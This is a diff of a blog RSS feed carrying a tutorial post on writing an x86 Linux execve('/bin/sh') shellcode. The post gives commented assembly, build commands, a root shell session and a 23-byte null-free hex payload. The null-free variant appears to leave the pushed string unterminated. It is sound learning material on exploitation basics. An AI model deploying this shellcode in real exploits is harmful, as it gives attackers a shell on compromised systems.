@@ -2,47 +2,64 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title></title>
-    <description></description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 17 Sep 2017 02:12:54 -0300</pubDate>
-    <lastBuildDate>Sun, 17 Sep 2017 02:12:54 -0300</lastBuildDate>
+    <description>Hacking and other stuffs</description>
+    <link>http://localhost:4000//</link>
+    <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 17 Sep 2017 05:20:15 -0300</pubDate>
+    <lastBuildDate>Sun, 17 Sep 2017 05:20:15 -0300</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
     
       <item>
-        <title>Creating a simple /bin/sh shellcode</title>
-        <description>&lt;p&gt;It’s a simple x86 shellcode to call /bin/sh, the initial code to undestand the sys_execve above have all the comments,&lt;/p&gt;
+        <title>Creating a simple x86 shellcode</title>
+        <description>&lt;p&gt;&lt;b&gt;&lt;font color=&quot;red&quot;&gt;I'm using a x64 linux to do this&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;;section .data:
-;	cmd: db &quot;/bin/sh&quot;,0x0
+&lt;p&gt;It’s a simple x86 shellcode to call /bin/sh, but the first thing is understand how the sys_execve works, to do so you can access this &lt;a href=&quot;https://syscalls.kernelgrok.com/&quot; target=&quot;_blank&quot;&gt;site&lt;/a&gt; that gives to you a list with all the x86 syscalls, and the values you need to put in each register, just search for sys_execve.&lt;/p&gt;
 
+&lt;p&gt;The initial code bellow have all the comments to make it easy to understand how to use the sys_execve,&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;section .data:
+	cmd: db &lt;span class=&quot;s2&quot;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;,0x0
 section .text:
 	global _start
 	_start:
-		push ebp		;prologo
-		mov ebp,esp		;prologo
-		sub esp,10		;reserve 10bytes on stack
-		push 0x68732f6e		;send hs/n to stack
-		push 0x69622f2f		;send ib// to stack
-		xor eax,eax		;zero to eax
-		add eax,0x0b		;add 0x0b on eax to call sys_execve(you can consult it on https://syscalls.kernelgrok.com/)
-		mov ebx,esp		;mov //bin/sh(hs/nib//) to ebx
-		xor edx,edx		;zero to edx first arg
-		xor ecx,edx		;zero ecx second arg
-		int 0x80		;kernel interrupt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+		mov eax,0x0b	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;use sys_execve
+		mov ebx,cmd	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;first arg, file to execute
+		mov edx,0x0	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;first parameter no usage
+		mov ecx,0x0	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;second parameter no usage
+		int 0x80	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;kernel interrupt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;compiler &amp;amp;&amp;amp; linker&lt;/p&gt;
+&lt;p&gt;Just to test this code, lets compile it, link and execute the binary shell to get the /bin/sh&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nasm -f elf32 sh3llc0d3.asm &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o shell sh3llc0d3.o&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;root@demoniware:~/shellcode# nasm -f elf32 sh3llc0d3.asm &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -m elf_i386 -s -o shell sh3llc0d3.o
+root@demoniware:~/shellcode# ./shell
+&lt;span class=&quot;c1&quot;&gt;# id&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;29 bytes shellcode&lt;/p&gt;
+&lt;p&gt;But this code is not nullbyte free and it’s a problem when we are working with shellcodes, so with some work I got this code,&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;E5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6E&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2F&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;C0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;C0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0B&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;E3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;CD&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;section .text:
+	global _start
+	_start:
+		push ebp		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;prologue
+		mov ebp,esp		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;prologue
+		sub esp,10		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;reserve &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; bytes on stack
+		push 0x68732f6e		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;send hs/n to stack
+		push 0x69622f2f		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;send ib// to stack
+		xor eax,eax		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zero to eax
+		add eax,0x0b		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;add 0x0b on eax to call sys_execve
+		mov ebx,esp		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;mov //bin/sh&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hs/nib//&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to ebx
+		xor edx,edx		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zero to edx first arg
+		xor ecx,edx		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zero ecx second arg
+		int 0x80		&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;kernel interrupt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To confirm if my code is free of nullbytes, I used this site &lt;a href=&quot;https://defuse.ca/online-x86-assembler.htm#disassembly&quot; target=&quot;_blank&quot;&gt;defuse.ca&lt;/a&gt;, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 23 bytes because the shellcode does not need the prologue&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;d1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;cd&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 </description>
         <pubDate>Sat, 16 Sep 2017 22:51:00 -0300</pubDate>
-        <link>http://localhost:4000/reversing/2017/09/16/Creating-a-simple-shellcode.html</link>
-        <guid isPermaLink="true">http://localhost:4000/reversing/2017/09/16/Creating-a-simple-shellcode.html</guid>
+        <link>http://localhost:4000//reversing/2017/09/16/simple-x86-shellcode.html</link>
+        <guid isPermaLink="true">http://localhost:4000//reversing/2017/09/16/simple-x86-shellcode.html</guid>
         
         
         <category>Reversing</category>
